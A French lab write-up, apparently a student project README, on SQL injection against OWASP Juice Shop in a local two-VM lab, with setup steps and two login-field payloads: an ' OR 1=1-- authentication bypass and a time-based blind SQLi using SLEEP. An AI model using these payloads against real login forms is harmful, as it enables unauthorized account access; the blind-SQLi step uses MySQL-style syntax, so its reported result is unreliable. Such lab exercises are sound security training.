# Projet n°2 - Injection SQL sur OWASP Juice Shop

## 📚 Sommaire

1. [ Objectif du projet](#-objectif-du-projet)  
2. [ Environnement de test](#-environnement-de-test)  
3. [ Outils utilisés](#️-outils-utilisés)  
4. [ Étape 1 - Connexion des machines](#-étape-1--connexion-des-machines)  
5. [ Étape 2 - Lancement de Juice Shop](#-étape-2--lancement-de-juice-shop)  
6. [ Étape 3 - Connexion à Juice Shop](#-étape-3--connexion-à-juice-shop)  
7. [ Étape 4 - Injection SQL simple](#-étape-4--injection-sql-simple)  
8. [ Étape 5 - Injection SQL avancée (Blind SQLi)](#-étape-5--injection-sql-avancée-blind-sqli)  
9. [ Attaque via Burp Suite](#-attaque-via-burp-suite)  
10. [ Vocabulaire utile](#-vocabulaire-utile)  
11. [🛡️ Sécurité & Légalité](#️-sécurité--légalité)  
12. [ Suivi des projets GitHub](#-suivi-des-projets-github)  

---

##  Objectif du projet

Simuler une attaque **SQL Injection** dans un environnement sécurisé et local, via l’application volontairement vulnérable **OWASP Juice Shop**, afin de comprendre les risques liés à l'injection de requêtes SQL.

---

##  Environnement de test

| Machine       | OS/Distro         | Rôle        | Adresse IP        |
|---------------|-------------------|-------------|-------------------|
| Parrot OS     | Parrot Security   | Attaquant   | `192.168.100.20`  |
| Debian        | Debian 13         | Victime     | `192.168.100.10`  |

➡️ Les deux machines tournent sur **VirtualBox** en **réseau local (bridge)**.

---

##  Outils utilisés

| Outil             | Fonction                                           |
|-------------------|----------------------------------------------------|
| Docker            | Déploiement de Juice Shop sur Debian               |
| OWASP Juice Shop  | Application vulnérable à tester                    |
| Firefox           | Navigateur web                                     |
| Burp Suite        | Interception et analyse des requêtes HTTP          |
| Terminal Linux    | Commandes réseau (ping, docker...)                 |

---

##  Étape 1 - Connexion des machines

Depuis Parrot :
ping 192.168.100.10

Depuis Debian :
ping 192.168.100.20

✅ Le ping confirme une communication bidirectionnelle entre Parrot (attaquant) et Debian (victime).

---

Étape 2 - Lancement de Juice Shop (sur Debian)

cd /root/
sudo ./start_juice.sh
sudo docker ps

🟢 Juice Shop est accessible depuis Parrot :
`192.168.100.10:3000`

---
🔓 Étape 3 - Connexion à Juice Shop

ℹ️ Remarque importante : Le service Juice Shop est hébergé sur la machine Debian (victime), mais l'accès à l'interface web se fait depuis Parrot (attaquant) via un navigateur.

URL de connexion (depuis Parrot) :

URL de connexion : `http://192.168.100.10:3000`

---

 Étape 4 – Injection SQL simple

Champ	Valeur
Email	' OR 1=1--
Password	n'importe quoi

✅ Connexion réussie sans mot de passe grâce à une injection SQL simple.

⸻

👁️ Étape 5 – Injection SQL avancée (Blind SQLi)

Champ	Valeur
Email	' OR IF(1=1, SLEEP(5), 0)--
Password	test

✅ Le serveur prend 5 secondes à répondre, confirmant une Blind SQLi (injection sans message d’erreur).

